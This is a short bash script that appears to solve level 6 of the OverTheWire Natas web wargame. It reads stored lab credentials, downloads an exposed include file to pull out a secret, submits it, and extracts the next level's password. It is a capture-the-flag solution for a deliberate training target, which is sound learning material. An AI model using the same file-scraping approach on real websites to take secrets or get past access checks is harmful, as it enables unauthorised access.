#!/bin/bash
url="http://natas6.natas.labs.overthewire.org"
user="natas6"
pass=$(cat credentials/natas6)

input_secret=$(curl -s -u "$user:$pass" "$url/includes/secret.inc" | grep "secret" | awk '{print $3}' | tr -d ';"')

curl -s -X POST -d "secret=$input_secret" -d "submit=submit" -u "$user:$pass" "$url" | grep "The password" | awk '{print $8 }'
